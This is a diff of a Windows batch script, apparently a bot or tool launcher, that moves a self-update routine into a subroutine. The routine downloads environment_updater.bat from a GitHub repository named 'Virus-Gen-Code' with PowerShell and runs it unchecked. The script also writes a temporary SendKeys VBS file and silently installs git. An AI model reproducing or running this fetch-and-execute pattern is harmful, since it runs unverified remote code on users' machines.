@@ -4,11 +4,7 @@
 set update_number=V4.42.35
 set dev=1
 cls
-if not exist environment_updater.bat (
-    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/environment_updater.bat").Content >"environment_updater.bat"
-    call environment_updater.bat
-    exit
-)
+if not exist environment_updater.bat (call :downloadenvup)
 :VBSDynamicBuild
 SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
 IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
@@ -369,6 +365,10 @@ echo [33minstalling git...[0m
 gitDL.exe /silent
 del gitDL.exe
 goto start
+:downloadenvup
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/environment_updater.bat").Content >"environment_updater.bat"
+call environment_updater.bat
+exit /b
 :EP_module
 echo.
 echo Hello %username%, you have been granted access to the EP bot module.
